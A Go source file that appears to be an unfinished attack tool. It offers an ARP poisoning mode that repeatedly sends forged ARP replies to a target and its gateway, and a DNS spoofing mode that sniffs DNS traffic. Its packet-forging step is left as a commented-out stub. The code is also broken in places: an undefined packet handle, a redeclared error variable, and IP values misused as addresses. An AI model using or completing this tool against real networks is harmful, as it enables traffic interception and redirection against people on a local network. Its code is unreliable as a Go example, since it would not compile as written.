package main;

import(
	"flag"
	"io"
	"log"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
	"time"
)

func main(){

	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
	targetMAC := flag.String("tMac", "FF:FF:FF:FF:FF:FF", "The target mac address.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
	modePtr := flag.String("mode", "spoof", "Sets the mode to run in, may either be 'arp' or 'spoof', arp sets the program to arp poisoning mode and spoof to dns spoofing mode.");
	gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
	gatewayMAC := flag.String("gwMAC", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");
	
	flag.Parse();

	switch *modePtr {
	case "spoof":
		mangleDNS(*interfacePtr, *targetPtr);
		break;
	case "arp":
		arpPoison(*interfacePtr, *targetPtr, *targetMAC, *gatewayPtr, *gatewayMAC);
	}
	
}

func arpPoison(iface, target, targetMAC, gateway, gatewayMAC string){

	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
	checkError(err);
	
	hostMac, host := grabAddresses(iface);

	ethernetPacket := layers.Ethernet{};
	ethernetPacket.DstMAC, err = net.ParseMAC(targetMAC); 
	ethernetPacket.SrcMAC, err = net.ParseMAC(hostMac);
	
	arpPacket := layers.ARP{};
	arpPacket.AddrType = layers.LinkTypeEthernet;
	arpPacket.Protocol = layers.EthernetTypeARP;
	arpPacket.HwAddressSize = 6;
	arpPacket.ProtAddressSize = 4;
	arpPacket.Operation = 2;

	arpPacket.SourceHwAddress, err = net.ParseMAC(hostMac);
	arpPacket.SourceProtAddress = net.IP(host);
	arpPacket.DstHwAddress, err = net.ParseMAC("FF:FF:FF:FF:FF:FF");
	arpPacket.DstProtAddress = net.IP(target);

	gwEthernetPacket := ethernetPacket;
	gwARPPacket := arpPacket;

	gwARPPacket.DstHwAddress = net.IP(gateway);
	gwEthernetPacket.DstMAC, err = net.ParseMAC(gatewayMAC);

	for {
		//poison target
		writePoison(arpPacket, ethernetPacket);
		//poison gateway
		writePoison(gwARPPacket, gwEthernetPacket);

		time.Sleep(1 * time.Second);
	}
		
}

func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{};
	
	err := arpPacket.SerializeTo(&buf, opts);
	checkError(err);

	err := etherPacket.SerializeTo(&buf, opts);
	checkError(err);

	packetData := buf.Bytes();
	handle.WritePacketData(packetData);
}

func mangleDNS(iface, target string){

	_, host := grabAddresses(iface);
	
	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
	checkError(err);
	err = handle.SetBPFFilter("dns");
	checkError(err);

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket() 
		if err == io.EOF {
			break
		} else if err != nil {
			log.Println("Error:", err)
			continue;
		}
		if dnsLayer := packet.Layer(layers.LayerTypeDNS); dnsLayer != nil {
			ipLayer := packet.Layer(layers.LayerTypeIPv4);
			// handlePacket(ipLayer.(*layers.IPv4), dnsLayer.(*layers.DNS));
		}
	}
}
/* 
    FUNCTION: handlePacket(ipLayer *layers.IPv4, udpLayer *layers.UDP, port, lport int){
    RETURNS: Nothing
    ARGUMENTS: 
                *layers.IPv4 ipLayer - the ip part of the packet recieved
                *layers.UDP udpLayer - the udp part of the packet recieved
                  int port : port to send data to
                  int lport : port to listen for data on

    ABOUT:
    Performs packet sniffing using gopacket (libpcap). 
*/
// func handlePacket(ipLayer *layers.IPv4, dnsLayer *layers.DNS){

// 	ip := &layers.IPv4{
// 		SrcIP: net.IP{,
// 		DstIP: net.IP{5, 6, 7, 8},
// 		// etc...
// 	}
	
// 	dns := &layers.DNS{

// 	}
	
// 	buf := gopacket.NewSerializeBuffer()
// 	opts := gopacket.SerializeOptions{}  // See SerializeOptions for more details.
// 	err := ip.SerializeTo(&buf, opts)
// }
